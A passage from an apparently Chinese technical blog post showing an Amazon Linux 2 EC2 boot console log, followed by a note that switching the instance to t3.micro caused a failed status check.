class="line">[[32m  OK  [0m] Reached target Sockets.</span><br><span class="line">         Starting Journal Service...</span><br><span class="line">         Starting dracut cmdline hook...</span><br><span class="line">         Starting Apply Kernel Variables...</span><br><span class="line">[[32m  OK  [0m] Started Setup Virtual Console.</span><br><span class="line">[[32m  OK  [0m] Started Create list of required sta...ce nodes for the current kernel.</span><br><span class="line">[    1.952087] tsc: Refined TSC clocksource calibration: 2399.999 MHz</span><br><span class="line">[    1.957717] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2298364cab5, max_idle_ns: 440795214892 ns</span><br><span class="line">[[32m  OK  [0m] Started Apply Kernel Variables.</span><br><span class="line">[[32m  OK  [0m] Started Journal Service.</span><br><span class="line">         Starting Create Static Device Nodes in /dev...</span><br><span class="line">[[32m  OK  [0m] Started Create Static Device Nodes in /dev.</span><br><span class="line">[[32m  OK  [0m] Started dracut cmdline hook.</span><br><span class="line">         Starting dracut pre-udev hook...</span><br><span class="line">[    2.069351] device-mapper: uevent: version 1.0.3</span><br><span class="line">[    2.075197] device-mapper: ioctl: 4.37.0-ioctl (2017-09-20) initialised: dm-devel@redhat.com</span><br><span class="line">[[32m  OK  [0m] Started dracut pre-udev hook.</span><br><span class="line">         Starting udev Kernel Device Manager...</span><br><span class="line">[[32m  OK  [0m] Started udev Kernel Device Manager.</span><br><span class="line">         Starting dracut pre-trigger hook...</span><br><span class="line">[[32m  OK  [0m] Started dracut pre-trigger hook.</span><br><span class="line">         Starting udev Coldplug all Devices...</span><br><span class="line">[[32m  OK  [0m] Started udev Coldplug all Devices.</span><br><span class="line">         Starting dracut initqueue hook...</span><br><span class="line">[[32m  OK  [0m] Reached target System Initialization.</span><br><span class="line">         Starting Show Plymouth Boot Screen...</span><br><span class="line">[[32m  OK  [0m] Started Show Plymouth Boot Screen.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Paths.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Basic System.</span><br><span class="line"></span><br><span class="line">[    2.338572] SCSI subsystem initialized</span><br><span class="line">[    2.360522] Invalid max_queues (4), will use default max: 1.</span><br><span class="line">[    2.384475] AVX2 version of gcm_enc/dec engaged.</span><br><span class="line">[    2.388424] AES CTR mode by8 optimization enabled</span><br><span class="line">%G[    2.398122] scsi host0: ata_piix</span><br><span class="line">[    2.402460] scsi host1: ata_piix</span><br><span class="line">[    2.406206] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc100 irq 14</span><br><span class="line">[    2.413347] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc108 irq 15</span><br><span class="line">[    2.487354] blkfront: xvda: barrier or flush: disabled; persistent grants: disabled; indirect descriptors: enabled;</span><br><span class="line">[    2.501223] alg: No test for pcbc(aes) (pcbc-aes-aesni)</span><br><span class="line">[    2.515176]  xvda: xvda1</span><br><span class="line">[    2.526801] blkfront: xvdf: barrier or flush: disabled; persistent grants: disabled; indirect descriptors: enabled;</span><br><span class="line">[[32m  OK  [0m] Found device /dev/disk/by-uuid/0a5c8d10-5fd5-4c87-8778-4afc3ce97dd9.</span><br><span class="line"></span><br><span class="line">         Starting File System Check on /dev/...0-5fd5-4c87-8778-4afc3ce97dd9...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started dracut initqueue hook.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Remote File Systems (Pre).</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Remote File Systems.</span><br><span class="line"></span><br><span class="line">         Starting dracut pre-mount hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started File System Check on /dev/d...d10-5fd5-4c87-8778-4afc3ce97dd9.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started dracut pre-mount hook.</span><br><span class="line"></span><br><span class="line">         Mounting /sysroot...</span><br><span class="line"></span><br><span class="line">[    2.743138] SGI XFS with ACLs, security attributes, no debug enabled</span><br><span class="line">[    2.751297] XFS (xvda1): Mounting V5 Filesystem</span><br><span class="line">[    3.068566] XFS (xvda1): Ending clean mount</span><br><span class="line">[[32m  OK  [0m] Mounted /sysroot.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Initrd Root File System.</span><br><span class="line"></span><br><span class="line">         Starting Reload Configuration from the Real Root...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Reload Configuration from the Real Root.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Initrd File Systems.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Initrd Default Target.</span><br><span class="line"></span><br><span class="line">         Starting dracut pre-pivot and cleanup hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started dracut pre-pivot and cleanup hook.</span><br><span class="line"></span><br><span class="line">         Starting Cleaning Up and Shutting Down Daemons...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Cleaning Up and Shutting Down Daemons.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut pre-pivot and cleanup hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut pre-pivot and cleanup hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Remote File Systems.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Timers.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut pre-mount hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut pre-mount hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Remote File Systems (Pre).</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut initqueue hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut initqueue hook...</span><br><span class="line"></span><br><span class="line">         Starting Plymouth switch root service...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Initrd Default Target.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Basic System.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Paths.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Sockets.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target System Initialization.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Local File Systems.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Swap.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Local Encrypted Volumes.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped udev Coldplug all Devices.</span><br><span class="line"></span><br><span class="line">         Stopping udev Coldplug all Devices...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut pre-trigger hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut pre-trigger hook...</span><br><span class="line"></span><br><span class="line">         Stopping udev Kernel Device Manager...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Apply Kernel Variables.</span><br><span class="line"></span><br><span class="line">         Stopping Apply Kernel Variables...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Slices.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped udev Kernel Device Manager.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Create Static Device Nodes in /dev.</span><br><span class="line"></span><br><span class="line">         Stopping Create Static Device Nodes in /dev...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Create list of required sta...ce nodes for the current kernel.</span><br><span class="line"></span><br><span class="line">         Stopping Create list of required st... nodes for the current kernel...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut pre-udev hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut pre-udev hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut cmdline hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut cmdline hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Closed udev Control Socket.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Closed udev Kernel Socket.</span><br><span class="line"></span><br><span class="line">         Starting Cleanup udevd DB...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Cleanup udevd DB.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Switch Root.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Plymouth switch root service.</span><br><span class="line"></span><br><span class="line">         Starting Switch Root...</span><br><span class="line"></span><br><span class="line">[    3.461464] systemd-journald[935]: Received SIGTERM from PID 1 (systemd).</span><br><span class="line">[    3.490373] systemd: 28 output lines suppressed due to ratelimiting</span><br><span class="line">[    3.578935] SELinux:  Disabled at runtime.</span><br><span class="line">[    3.592118] audit: type=1404 audit(1573719001.524:2): selinux=0 auid=4294967295 ses=4294967295</span><br><span class="line">[    3.629245] ip_tables: (C) 2000-2006 Netfilter Core Team</span><br><span class="line">[    3.636968] systemd[1]: Inserted module &apos;ip_tables&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to [0;33mAmazon Linux 2[0m!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Switch Root.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Journal Service.</span><br><span class="line"></span><br><span class="line">         Starting Journal Service...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Created slice system-getty.slice.</span><br><span class="line"></span><br><span class="line">         Mounting Huge Pages File System...</span><br><span class="line"></span><br><span class="line">         Mounting Debug File System...</span><br><span class="line"></span><br><span class="line">         Starting Create list of required st... nodes for the current kernel...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Created slice system-serial\x2dgetty.slice.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Set up automount Arbitrary Executab...ats File System Automount Point.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on /dev/initctl Compatibility Named Pipe.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on udev Control Socket.</span><br><span class="line"></span><br><span class="line">         Starting Remount Root and Kernel File Systems...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Created slice User and Session Slice.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Slices.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Created slice system-selinux\x2dpol...grate\x2dlocal\x2dchanges.slice.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on LVM2 metadata daemon socket.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on Delayed Shutdown Socket.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on LVM2 poll daemon socket.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Paths.</span><br><span class="line"></span><br><span class="line">         Starting Load Kernel Modules...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on Device-mapper event daemon FIFOs.</span><br><span class="line"></span><br><span class="line">[    3.975370] ena: Elastic Network Adapter (ENA) v2.1.1g</span><br><span class="line">[    4.021973] systemd-journald[1935]: Received request to flush runtime journal from PID 1</span><br><span class="line">         Starting Monitoring of LVM2 mirrors... dmeventd or progress polling...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Swap.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Switch Root.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Initrd File Systems.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Initrd Root File System.</span><br><span class="line"></span><br><span class="line">         Mounting POSIX Message Queue File System...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Created slice system-systemd\x2dfsck.slice.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on udev Kernel Socket.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Mounted Debug File System.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Mounted Huge Pages File System.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Journal Service.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Create list of required sta...ce nodes for the current kernel.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Remount Root and Kernel File Systems.</span><br><span class="line"></span><br><span class="line">         Starting udev Coldplug all Devices...</span><br><span class="line"></span><br><span class="line">         Starting Load/Save Random Seed...</span><br><span class="line"></span><br><span class="line">         Starting Create Static Device Nodes in /dev...</span><br><span class="line"></span><br><span class="line">         Starting Flush Journal to Persistent Storage...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Mounted POSIX Message Queue File System.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Load Kernel Modules.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Load/Save Random Seed.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started LVM2 metadata daemon.</span><br><span class="line"></span><br><span class="line">         Starting LVM2 metadata daemon...</span><br><span class="line"></span><br><span class="line">         Starting Apply Kernel Variables...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Create Static Device Nodes in /dev.</span><br><span class="line"></span><br><span class="line">         Starting udev Kernel Device Manager...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Apply Kernel Variables.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started udev Coldplug all Devices.</span><br><span class="line"></span><br><span class="line">         Starting udev Wait for Complete Device Initialization...</span><br><span class="line"></span><br><span class="line">[    4.374754] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input3</span><br><span class="line">[    4.377891] ACPI: Power Button [PWRF]</span><br><span class="line">[    4.377940] input: Sleep Button as /devices/LNXSYSTM:00/LNXSLPBN:00/input/input4</span><br><span class="line">[    4.377949] ACPI: Sleep Button [SLPF]</span><br><span class="line">[    4.457594] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input5</span><br><span class="line">[    4.502536] mousedev: PS/2 mouse device common for all mice</span><br><span class="line">[    4.534600] EDAC sbridge: Seeking for: PCI ID 8086:2fa0</span><br><span class="line">[    4.534603] EDAC sbridge:  Ver: 1.1.2 </span><br><span class="line">[[32m  OK  [0m] Started udev Kernel Device Manager.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Flush Journal to Persistent Storage.</span><br><span class="line"></span><br><span class="line">%G[[32m  OK  [0m] Found device /dev/ttyS0.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Created slice system-ec2net\x2difup.slice.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Found device /dev/xvdf.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started udev Wait for Complete Device Initialization.</span><br><span class="line"></span><br><span class="line">         Starting Activation of DM RAID sets...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Activation of DM RAID sets.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Local Encrypted Volumes.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Monitoring of LVM2 mirrors,...ng dmeventd or progress polling.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Local File Systems (Pre).</span><br><span class="line"></span><br><span class="line">         Starting File System Check on /dev/xvdf...</span><br><span class="line"></span><br><span class="line">[    4.732438] systemd-fsck[2634]: /usr/sbin/fsck.xfs: XFS file system.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started File System Check on /dev/xvdf.</span><br><span class="line"></span><br><span class="line">         Mounting /data...</span><br><span class="line"></span><br><span class="line">[    4.759156] XFS (xvdf): Mounting V5 Filesystem</span><br><span class="line">[    4.780691] XFS (xvdf): Ending clean mount</span><br><span class="line">[[32m  OK  [0m] Mounted /data.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Local File Systems.</span><br><span class="line"></span><br><span class="line">         Starting Preprocess NFS configuration...</span><br><span class="line"></span><br><span class="line">         Starting Create Volatile Files and Directories...</span><br><span class="line"></span><br><span class="line">         Starting Tell Plymouth To Write Out Runtime Data...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Preprocess NFS configuration.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Create Volatile Files and Directories.</span><br><span class="line"></span><br><span class="line">         Mounting RPC Pipe File System...</span><br><span class="line"></span><br><span class="line">         Starting Security Auditing Service...</span><br><span class="line"></span><br><span class="line">[    4.891999] RPC: Registered named UNIX socket transport module.</span><br><span class="line">[    4.891999] RPC: Registered udp transport module.</span><br><span class="line">[    4.892000] RPC: Registered tcp transport module.</span><br><span class="line">[    4.892000] RPC: Registered tcp NFSv4.1 backchannel transport module.</span><br><span class="line">[[32m  OK  [0m] Mounted RPC Pipe File System.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target rpc_pipefs.target.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Tell Plymouth To Write Out Runtime Data.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Security Auditing Service.</span><br><span class="line"></span><br><span class="line">         Starting Update UTMP about System Boot/Shutdown...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Update UTMP about System Boot/Shutdown.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target System Initialization.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on D-Bus System Message Bus Socket.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Timers.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on RPCbind Server Activation Socket.</span><br><span class="line"></span><br><span class="line">         Starting RPC bind service...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Sockets.</span><br><span class="line">[    5.106374] random: crng init done</span><br><span class="line">[    5.112685] random: 7 urandom warning(s) missed due to ratelimiting</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Basic System.</span><br><span class="line"></span><br><span class="line">         Starting ACPI Event Daemon...</span><br><span class="line"></span><br><span class="line">         Starting Resets System Activity Logs...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Hardware RNG Entropy Gatherer Daemon.</span><br><span class="line"></span><br><span class="line">         Starting Hardware RNG Entropy Gatherer Daemon...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started libstoragemgmt plug-in server daemon.</span><br><span class="line"></span><br><span class="line">         Starting libstoragemgmt plug-in server daemon...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started D-Bus System Message Bus.</span><br><span class="line"></span><br><span class="line">         Starting D-Bus System Message Bus...</span><br><span class="line"></span><br><span class="line">         Starting Initial cloud-init job (pre-networking)...</span><br><span class="line"></span><br><span class="line">         Starting Login Service...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started irqbalance daemon.</span><br><span class="line"></span><br><span class="line">         Starting irqbalance daemon...</span><br><span class="line"></span><br><span class="line">         Starting NTP client/server...</span><br><span class="line"></span><br><span class="line">         Starting GSSAPI Proxy Daemon...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started RPC bind service.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started ACPI Event Daemon.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Resets System Activity Logs.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Login Service.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started GSSAPI Proxy Daemon.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target NFS client services.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Remote File Systems (Pre).</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Remote File Systems.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started NTP client/server.</span><br><span class="line"></span><br><span class="line">[    6.110545] cloud-init[2698]: Cloud-init v. 18.5-2.amzn2 running &apos;init-local&apos; at Thu, 14 Nov 2019 08:10:04 +0000. Up 6.07 seconds.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Initial cloud-init job (pre-networking).</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Network (Pre).</span><br><span class="line"></span><br><span class="line">         Starting LSB: Bring up/down networking...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started LSB: Bring up/down networking.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Network.</span><br><span class="line"></span><br><span class="line">         Starting Postfix Mail Transport Agent...</span><br><span class="line"></span><br><span class="line">         Starting Initial cloud-init job (metadata service crawler)...</span><br><span class="line"></span><br><span class="line">[    8.385484] cloud-init[3057]: Cloud-init v. 18.5-2.amzn2 running &apos;init&apos; at Thu, 14 Nov 2019 08:10:06 +0000. Up 8.33 seconds.</span><br><span class="line"></span><br><span class="line">[    8.432184] cloud-init[3057]: ci-info: ++++++++++++++++++++++++++++++++++++++Net device info+++++++++++++++++++++++++++++++++++++++</span><br><span class="line"></span><br><span class="line">[    8.436977] cloud-init[3057]: ci-info: +--------+------+-----------------------------+---------------+--------+-------------------+</span><br><span class="line"></span><br><span class="line">[    8.437462] cloud-init[3057]: ci-info: | Device |  Up  |           Address           |      Mask     | Scope  |     Hw-Address    |</span><br><span class="line"></span><br><span class="line">[    8.440969] cloud-init[3057]: ci-info: +--------+------+-----------------------------+---------------+--------+-------------------+</span><br><span class="line"></span><br><span class="line">[    8.441378] cloud-init[3057]: ci-info: |  eth0  | True |           10.0.3.4          | 255.255.255.0 | global | 06:db:1b:e7:ab:1e |</span><br><span class="line"></span><br><span class="line">[    8.441715] cloud-init[3057]: ci-info: |  eth0  | True | fe80::4db:1bff:fee7:ab1e/64 |       .       |  link  | 06:db:1b:e7:ab:1e |</span><br><span class="line"></span><br><span class="line">[    8.441840] cloud-init[3057]: ci-info: |   lo   | True |          127.0.0.1          |   255.0.0.0   |  host  |         .         |</span><br><span class="line"></span><br><span class="line">[    8.441959] cloud-init[3057]: ci-info: |   lo   | True |           ::1/128           |       .       |  host  |         .         |</span><br><span class="line"></span><br><span class="line">[    8.442069] cloud-init[3057]: ci-info: +--------+------+-----------------------------+---------------+--------+-------------------+</span><br><span class="line"></span><br><span class="line">[    8.442187] cloud-init[3057]: ci-info: ++++++++++++++++++++++++++++++Route IPv4 info+++++++++++++++++++++++++++++++</span><br><span class="line"></span><br><span class="line">[    8.442301] cloud-init[3057]: ci-info: +-------+-----------------+----------+-----------------+-----------+-------+</span><br><span class="line"></span><br><span class="line">[    8.442418] cloud-init[3057]: ci-info: | Route |   Destination   | Gateway  |     Genmask     | Interface | Flags |</span><br><span class="line"></span><br><span class="line">[    8.442525] cloud-init[3057]: ci-info: +-------+-----------------+----------+-----------------+-----------+-------+</span><br><span class="line"></span><br><span class="line">[    8.442633] cloud-init[3057]: ci-info: |   0   |     0.0.0.0     | 10.0.3.1 |     0.0.0.0     |    eth0   |   UG  |</span><br><span class="line"></span><br><span class="line">[    8.442740] cloud-init[3057]: ci-info: |   1   |     10.0.3.0    | 0.0.0.0  |  255.255.255.0  |    eth0   |   U   |</span><br><span class="line"></span><br><span class="line">[    8.442846] cloud-init[3057]: ci-info: |   2   | 169.254.169.254 | 0.0.0.0  | 255.255.255.255 |    eth0   |   UH  |</span><br><span class="line"></span><br><span class="line">[    8.442952] cloud-init[3057]: ci-info: +-------+-----------------+----------+-----------------+-----------+-------+</span><br><span class="line"></span><br><span class="line">[    8.443063] cloud-init[3057]: ci-info: +++++++++++++++++++Route IPv6 info+++++++++++++++++++</span><br><span class="line"></span><br><span class="line">[    8.443177] cloud-init[3057]: ci-info: +-------+-------------+---------+-----------+-------+</span><br><span class="line"></span><br><span class="line">[    8.443293] cloud-init[3057]: ci-info: | Route | Destination | Gateway | Interface | Flags |</span><br><span class="line"></span><br><span class="line">[    8.443402] cloud-init[3057]: ci-info: +-------+-------------+---------+-----------+-------+</span><br><span class="line"></span><br><span class="line">[    8.443508] cloud-init[3057]: ci-info: |   9   |  fe80::/64  |    ::   |    eth0   |   U   |</span><br><span class="line"></span><br><span class="line">[    8.443614] cloud-init[3057]: ci-info: |   11  |    local    |    ::   |    eth0   |   U   |</span><br><span class="line"></span><br><span class="line">[    8.443727] cloud-init[3057]: ci-info: |   12  |   ff00::/8  |    ::   |    eth0   |   U   |</span><br><span class="line"></span><br><span class="line">[    8.443851] cloud-init[3057]: ci-info: +-------+-------------+---------+-----------+-------+</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Postfix Mail Transport Agent.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Initial cloud-init job (metadata service crawler).</span><br><span class="line"></span><br><span class="line">         Starting Permit User Sessions...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Cloud-config availability.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Network is Online.</span><br><span class="line"></span><br><span class="line">         Starting Notify NFS peers of a restart...</span><br><span class="line"></span><br><span class="line">         Starting Dynamically Generate Message Of The Day...</span><br><span class="line"></span><br><span class="line">         Starting System Logging Service...</span><br><span class="line"></span><br><span class="line">         Starting Apply the settings specified in cloud-config...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started amazon-ssm-agent.</span><br><span class="line"></span><br><span class="line">         Starting amazon-ssm-agent...</span><br><span class="line"></span><br><span class="line">         Starting EC2 Instance Connect Host Key Harvesting...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Permit User Sessions.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Notify NFS peers of a restart.</span><br><span class="line"></span><br><span class="line">         Starting Terminate Plymouth Boot Screen...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Job spooling tools.</span><br><span class="line"></span><br><span class="line">         Starting Job spooling tools...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Command Scheduler.</span><br><span class="line"></span><br><span class="line">         Starting Command Scheduler...</span><br><span class="line"></span><br><span class="line">         Starting Wait for Plymouth Boot Screen to Quit...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started System Logging Service.</span><br><span class="line"></span><br><span class="line">[   10.049503] cloud-init[3188]: Cloud-init v. 18.5-2.amzn2 running &apos;modules:config&apos; at Thu, 14 Nov 2019 08:10:07 +0000. Up 9.96 seconds.</span><br><span class="line">[   10.778911] cloud-init[3321]: Cloud-init v. 18.5-2.amzn2 running &apos;modules:final&apos; at Thu, 14 Nov 2019 08:10:08 +0000. Up 10.67 seconds.</span><br><span class="line">[   10.813622] cloud-init[3321]: Cloud-init v. 18.5-2.amzn2 finished at Thu, 14 Nov 2019 08:10:08 +0000. Datasource DataSourceEc2.  Up 10.80 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Amazon Linux 2</span><br><span class="line">Kernel 4.14.146-120.181.amzn2.x86_64 on an x86_64</span><br><span class="line"></span><br><span class="line">ip-10-0-3-4 login:</span><br></pre></td></tr></table></figure></li><li><p>然后我们给它切到t3.micro再重启看看<br><img src="00372983C37F4EB19579C73FD0ED29E1" alt="image"><br>可以看到现在已经1/2检查失败了，然后看看系统日志的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 